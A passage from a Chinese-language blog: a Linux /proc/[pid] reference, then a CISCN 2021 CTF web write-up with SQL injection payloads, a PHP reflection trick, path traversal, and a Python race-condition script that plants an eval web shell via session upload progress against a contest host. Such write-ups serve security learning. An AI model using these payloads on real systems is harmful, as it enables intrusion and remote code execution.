<h3 id="proc-pid-cwd"><a href="#proc-pid-cwd" class="headerlink" title="/proc/[pid]/cwd"></a>/proc/[pid]/cwd</h3><p>/proc/[pid]/cwd 是进程当前工作目录的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;cwd</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 12 20:39 &#x2F;proc&#x2F;2406&#x2F;cwd -&gt; &#x2F;home&#x2F;mike&#x2F;frp_0.13.0_linux_amd64</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-environ"><a href="#proc-pid-environ" class="headerlink" title="/proc/[pid]/environ"></a>/proc/[pid]/environ</h3><p>/proc/[pid]/environ 显示进程的环境变量。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ strings &#x2F;proc&#x2F;2406&#x2F;environ</span><br><span class="line"></span><br><span class="line">SUPERVISOR_GROUP_NAME&#x3D;ssh</span><br><span class="line">TERM&#x3D;linux</span><br><span class="line">SUPERVISOR_SERVER_URL&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock</span><br><span class="line">SUPERVISOR_PROCESS_NAME&#x3D;ssh</span><br><span class="line">RUNLEVEL&#x3D;2</span><br><span class="line">UPSTART_EVENTS&#x3D;runlevel</span><br><span class="line">PREVLEVEL&#x3D;N</span><br><span class="line">PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;sbin:&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin</span><br><span class="line">UPSTART_INSTANCE&#x3D;</span><br><span class="line">UPSTART_JOB&#x3D;rc</span><br><span class="line">SUPERVISOR_ENABLED&#x3D;1</span><br><span class="line">runlevel&#x3D;2</span><br><span class="line">PWD&#x3D;&#x2F;</span><br><span class="line">previous&#x3D;N</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-exe"><a href="#proc-pid-exe" class="headerlink" title="/proc/[pid]/exe"></a>/proc/[pid]/exe</h3><p>/proc/[pid]/exe 为实际运行程序的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;exe</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 11 19:00 &#x2F;proc&#x2F;2406&#x2F;exe -&gt; &#x2F;usr&#x2F;bin&#x2F;frps</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-fd"><a href="#proc-pid-fd" class="headerlink" title="/proc/[pid]/fd"></a>/proc/[pid]/fd</h3><p>/proc/[pid]/fd 是一个目录，包含进程打开文件的情况。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls -lt &#x2F;proc&#x2F;2406&#x2F;fd</span><br><span class="line"></span><br><span class="line">lrwx------ 1 root root 64 Dec 24 09:39 77 -&gt; socket:[44377722]</span><br><span class="line">lrwx------ 1 root root 64 Dec 17 15:07 47 -&gt; socket:[29482617]</span><br><span class="line">lr-x------ 1 root root 64 Dec 12 20:18 0 -&gt; pipe:[13282]</span><br><span class="line">l-wx------ 1 root root 64 Dec 12 20:18 1 -&gt; pipe:[13283]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 10 -&gt; socket:[12238218]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 4 -&gt; anon_inode:[eventpoll]</span><br><span class="line">lrwx------ 1 root root 64 Dec 12 20:18 40 -&gt; socket:[19378614]</span><br></pre></td></tr></table></figure>

<p>目录中的每一项都是一个符号链接，指向打开的文件，数字则代表文件描述符。</p>
<h3 id="proc-pid-latency"><a href="#proc-pid-latency" class="headerlink" title="/proc/[pid]/latency"></a>/proc/[pid]/latency</h3><p>/proc/[pid]/latency 显示哪些代码造成的延时比较大。如果要使用这个特性需要执行：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;latencytop</span><br></pre></td></tr></table></figure>

<p>举例如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;latency</span><br><span class="line"></span><br><span class="line">Latency Top version : v0.1</span><br><span class="line">30667 10650491 4891 poll_schedule_timeout do_sys_poll SyS_poll system_call_fastpath 0x7f636573dc1d</span><br><span class="line">8 105 44 futex_wait_queue_me futex_wait do_futex SyS_futex system_call_fastpath 0x7f6365a167bc</span><br></pre></td></tr></table></figure>

<p>每一行前三个数字分别是后面代码执行的次数、总共执行延迟时间(单位是微秒)和最长执行延迟时间(单位是微秒)。后面则是代码完整的调用栈。</p>
<h3 id="proc-pid-maps"><a href="#proc-pid-maps" class="headerlink" title="/proc/[pid]/maps"></a>/proc/[pid]/maps</h3><p>/proc/[pid]/maps 显示进程的内存区域映射信息。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;maps</span><br><span class="line">00400000-006ea000 r-xp 00000000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">006ea000-00a6c000 r--p 002ea000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">00a6c000-00ab1000 rw-p 0066c000 fd:01 1727569                            &#x2F;usr&#x2F;bin&#x2F;frps</span><br><span class="line">00ab1000-00ad4000 rw-p 00000000 00:00 0</span><br><span class="line">c000000000-c00000b000 rw-p 00000000 00:00 0</span><br><span class="line">c41feac000-c420000000 rw-p 00000000 00:00 0</span><br><span class="line">c420000000-c420400000 rw-p 00000000 00:00 0</span><br><span class="line">c420400000-c420700000 rw-p 00000000 00:00 0</span><br><span class="line">c420700000-c420800000 rw-p 00000000 00:00 0</span><br><span class="line">c420800000-c420900000 rw-p 00000000 00:00 0</span><br><span class="line">c420900000-c420a00000 rw-p 00000000 00:00 0</span><br><span class="line">c420a00000-c421ea0000 rw-p 00000000 00:00 0</span><br><span class="line">c421ea0000-c422a00000 rw-p 00000000 00:00 0</span><br><span class="line">c422a00000-c422a60000 rw-p 00000000 00:00 0</span><br><span class="line">7f0418c01000-7f0418ee1000 rw-p 00000000 00:00 0</span><br><span class="line">7ffff7f4f000-7ffff7f70000 rw-p 00000000 00:00 0                          [stack:5121]</span><br><span class="line">7ffff7fad000-7ffff7faf000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7faf000-7ffff7fb1000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>

<p>其中注意的一点是 [stack:] 是线程的堆栈信息，对应于 /proc/[pid]/task/[tid]/ 路径。</p>
<h3 id="proc-pid-root"><a href="#proc-pid-root" class="headerlink" title="/proc/[pid]/root"></a>/proc/[pid]/root</h3><p>/proc/[pid]/root 是进程根目录的符号链接。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$  ls -lt &#x2F;proc&#x2F;2406&#x2F;root</span><br><span class="line">lrwxrwxrwx 1 root root 0 Dec 12 20:39 &#x2F;proc&#x2F;2406&#x2F;root -&gt; &#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-stack"><a href="#proc-pid-stack" class="headerlink" title="/proc/[pid]/stack"></a>/proc/[pid]/stack</h3><p>/proc/[pid]/stack 示当前进程的内核调用栈信息，只有内核编译时打开了 CONFIG_STACKTRACE 编译选项，才会生成这个文件。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;stack</span><br><span class="line">[&lt;ffffffff810fa996&gt;] futex_wait_queue_me+0xc6&#x2F;0x130</span><br><span class="line">[&lt;ffffffff810fb05d&gt;] futex_wait+0x17d&#x2F;0x270</span><br><span class="line">[&lt;ffffffff810fd2d5&gt;] do_futex+0xd5&#x2F;0x520</span><br><span class="line">[&lt;ffffffff810fd791&gt;] SyS_futex+0x71&#x2F;0x150</span><br><span class="line">[&lt;ffffffff8180cc76&gt;] entry_SYSCALL_64_fastpath+0x16&#x2F;0x75</span><br><span class="line">[&lt;ffffffffffffffff&gt;] 0xffffffffffffffff</span><br></pre></td></tr></table></figure>

<h3 id="proc-pid-statm"><a href="#proc-pid-statm" class="headerlink" title="/proc/[pid]/statm"></a>/proc/[pid]/statm</h3><p>/proc/[pid]/statm 显示进程所占用内存大小的统计信息。包含七个值，度量单位是 page(page大小可通过 getconf PAGESIZE 得到)。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$  cat &#x2F;proc&#x2F;2406&#x2F;statm  </span><br><span class="line">13720 2617 493 746 0 12007 0</span><br></pre></td></tr></table></figure>

<p>各个值含义：</p>
<blockquote>
<p>a）进程占用的总的内存<br>b）进程当前时刻占用的物理内存<br>c）同其它进程共享的内存<br>d）进程的代码段<br>e）共享库(从2.6版本起，这个值为0)<br>f）进程的堆栈<br>g）dirty pages(从2.6版本起，这个值为0)</p>
</blockquote>
<h3 id="proc-pid-status"><a href="#proc-pid-status" class="headerlink" title="/proc/[pid]/status"></a>/proc/[pid]/status</h3><p>/proc/[pid]/status 包含进程的状态信息。其很多内容与 /proc/[pid]/stat 和 /proc/[pid]/statm 相同，但是却是以一种更清晰地方式展现出来。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;status</span><br><span class="line">Name:	frps</span><br><span class="line">State:	S (sleeping)</span><br><span class="line">Tgid:	2406</span><br><span class="line">Ngid:	0</span><br><span class="line">Pid:	2406</span><br><span class="line">PPid:	2130</span><br><span class="line">TracerPid:	0</span><br><span class="line">Uid:	0	0	0	0</span><br><span class="line">Gid:	0	0	0	0</span><br><span class="line">FDSize:	128</span><br><span class="line">Groups:	0</span><br><span class="line">NStgid:	2406</span><br><span class="line">NSpid:	2406</span><br><span class="line">NSpgid:	2406</span><br><span class="line">NSsid:	2130</span><br><span class="line">VmPeak:	   54880 kB</span><br><span class="line">VmSize:	   54880 kB</span><br><span class="line">VmLck:	       0 kB</span><br><span class="line">VmPin:	       0 kB</span><br><span class="line">VmHWM:	   34872 kB</span><br><span class="line">VmRSS:	   10468 kB</span><br><span class="line">VmData:	   47896 kB</span><br><span class="line">VmStk:	     132 kB</span><br><span class="line">VmExe:	    2984 kB</span><br><span class="line">VmLib:	       0 kB</span><br><span class="line">VmPTE:	      68 kB</span><br><span class="line">VmPMD:	      20 kB</span><br><span class="line">VmSwap:	       0 kB</span><br><span class="line">HugetlbPages:	       0 kB</span><br><span class="line">Threads:	11</span><br><span class="line">SigQ:	0&#x2F;31834</span><br><span class="line">SigPnd:	0000000000000000</span><br><span class="line">ShdPnd:	0000000000000000</span><br><span class="line">SigBlk:	0000000000000000</span><br><span class="line">SigIgn:	0000000000000000</span><br><span class="line">SigCgt:	fffffffe7fc1feff</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	0000003fffffffff</span><br><span class="line">CapEff:	0000003fffffffff</span><br><span class="line">CapBnd:	0000003fffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br><span class="line">Seccomp:	0</span><br><span class="line">Cpus_allowed:	f</span><br><span class="line">Cpus_allowed_list:	0-3</span><br><span class="line">Mems_allowed:	00000000,00000001</span><br><span class="line">Mems_allowed_list:	0</span><br><span class="line">voluntary_ctxt_switches:	2251028</span><br><span class="line">nonvoluntary_ctxt_switches:	18031</span><br></pre></td></tr></table></figure>

<p>关于信号（signal）的信息：SigQ 分为两部分（例如 0/31834），前面表示当前处在队列中的信号（0），后面则表示队列一共可以存储多少信号（31834）；SigPnd 表示当前线程 pending 的信号，而ShdPnd 则表示整个进程 pending 的信号；SigBlk、SigIgn 和 SigCgt 分别表示对信号的处理是阻塞，忽略，还是捕获。（关于Unix信号的相关知识，可以参考 <a target="_blank" rel="noopener" href="https://www.networkworld.com/article/3211296/linux/unix-dealing-with-signals.html">Unix: Dealing with signals</a>）。</p>
<h3 id="proc-pid-syscall"><a href="#proc-pid-syscall" class="headerlink" title="/proc/[pid]/syscall"></a>/proc/[pid]/syscall</h3><p>/proc/[pid]/syscall 显示当前进程正在执行的系统调用。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;syscall</span><br><span class="line">202 0xab3730 0x0 0x0 0x0 0x0 0x0 0x7ffff7f6ec68 0x455bb3</span><br></pre></td></tr></table></figure>

<p>第一个值是系统调用号（202代表poll），后面跟着 6 个系统调用的参数值（位于寄存器中），最后两个值依次是堆栈指针和指令计数器的值。如果当前进程虽然阻塞，但阻塞函数并不是系统调用，则系统调用号的值为 -1，后面只有堆栈指针和指令计数器的值。如果进程没有阻塞，则这个文件只有一个 running 的字符串。</p>
<p>内核编译时打开了 CONFIG_HAVE_ARCH_TRACEHOOK 编译选项，才会生成这个文件。</p>
<h3 id="proc-pid-wchan"><a href="#proc-pid-wchan" class="headerlink" title="/proc/[pid]/wchan"></a>/proc/[pid]/wchan</h3><p>/proc/[pid]/wchan 显示当进程 sleep 时，kernel 当前运行的函数。举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cat &#x2F;proc&#x2F;2406&#x2F;wchan</span><br><span class="line">futex_wait_queue_meadmin</span><br></pre></td></tr></table></figure>

<h3 id="proc-self"><a href="#proc-self" class="headerlink" title="proc/self"></a>proc/self</h3><p>我们都知道可以通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>
<p><strong>所以我们可以通过self获取基于当前应用的不同信息</strong></p>
<p>参考:<a target="_blank" rel="noopener" href="https://www.hi-linux.com/posts/64295.html">https://www.hi-linux.com/posts/64295.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/dillanzhou/article/details/82876575">https://blog.csdn.net/dillanzhou/article/details/82876575</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/25/CISCN-web/">CISCN web</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-25</time><div class="content"><h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>输入信息 会报错<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515133740.png" alt="img"></p>
<p> 根据报错信息 sql注入 需要用’)绕过闭合</p>
<p>因为有报错，尝试报错注入:</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from (select * from flag as a join flag b)c)))#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134036.png" alt="img" style="zoom:67%;">

<p>这里的库又禁用了，想起来上次就是直接猜表名为flag于是</p>
<p>尝试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select 1 from flag)))#</span><br><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select aaa from fla)))#</span><br><span class="line">通过回显可以发现表名果然为flag</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from (select * from flag as a join flag b using(id,no))c)))#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134150.png" alt="img" style="zoom:67%;">
获得列名

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select &#96;87ed65c7-b43b-4438-a4b7-eed85ab78d4b&#96; from flag)))#</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134247.png" alt="img"></p>
<p>需要substr截取：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134337.png" alt="img" style="zoom:67%;"></p>
<p>参考文章:<a target="_blank" rel="noopener" href="https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/">https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/</a></p>
<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>看看备份目录 .index.php.swo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>找到源码，发现是php反射问题</p>
<p>反射类中存在两个参数的就是ReflectionMethod()<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515150028.png" alt="img" style="zoom:67%;"></p>
<p>和题目吗一毛一样接下来就看要运用哪个函数了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$method&#x3D;new ReflectionMethod(User,a);</span><br><span class="line">var_dump($method-&gt;getDocComment)</span><br><span class="line">rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;a&amp;rd&#x3D;getDocComment</span><br><span class="line">&#x2F;&#x2F;有个坑 他的flag是藏在其中一个方法的注释当中的，需要遍历一下！</span><br><span class="line">rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>

<p>PHP手册:<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/class.reflectionmethod.php">https://www.php.net/manual/zh/class.reflectionmethod.php</a></p>
<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>一开始扫描目录，获得you_can_seeeeeeee_me.php</p>
<p>发现是phpinfo的配置文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210516004816.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;fjjefccdjd</span><br></pre></td></tr></table></figure>

<p>看到很奇怪的session目录——&gt;考点文件包含+利用session进行文件上传（条件竞争）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;var_dump(scandir(&#x27;/etc/gcbcgffhac/egdcbahfbh/dedhfgiaai/dajfeeacie/aeebhaaejd/fl444444g&#x27;));&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../var/lib/php/sessions/fjjefccdjd/sess_&quot;</span>+sessid&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://124.70.0.162:24693&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://124.70.0.162:24693&#x27;</span>,data=data)</span><br><span class="line">        print(resp.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># if &#x27;passwd&#x27; in resp.text:</span></span><br><span class="line">        <span class="comment">#     print(resp.text)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment">#     event.clear()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>需要注意的是 etc的目录需要一个个跑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">[0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;.pwd.lock&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;X11&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;adduser.conf&quot;</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;alternatives&quot;</span><br><span class="line">  [6]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;apache2&quot;</span><br><span class="line">  [7]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;apparmor.d&quot;</span><br><span class="line">  [8]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;apt&quot;</span><br><span class="line">  [9]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;bash.bashrc&quot;</span><br><span class="line">  [10]&#x3D;&gt;</span><br><span class="line">  string(17) &quot;bash_completion.d&quot;</span><br><span class="line">  [11]&#x3D;&gt;</span><br><span class="line">  string(22) &quot;bindresvport.blacklist&quot;</span><br><span class="line">  [12]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;binfmt.d&quot;</span><br><span class="line">  [13]&#x3D;&gt;</span><br><span class="line">  string(15) 